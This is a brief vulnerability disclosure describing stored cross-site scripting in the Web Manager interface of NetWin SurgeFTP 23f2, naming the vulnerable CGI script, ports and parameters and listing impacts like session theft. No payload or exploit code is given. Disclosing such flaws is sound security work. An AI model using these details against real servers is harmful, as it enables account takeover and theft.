1. Description

cgi/surgeftpmgr.cgi (aka the Web Manager interface on TCP port 7021 or 9021) in NetWin SurgeFTP version 23f2 has  stored XSS via the classid, domainid, or username parameter. This is because user-supplied inputs are not sanitized. The attacker-supplied code can perform a wide variety of actions, such as stealing the victimas session token or login credentials, performing arbitrary actions on the victim&#039;s behalf, and logging their keystroke.
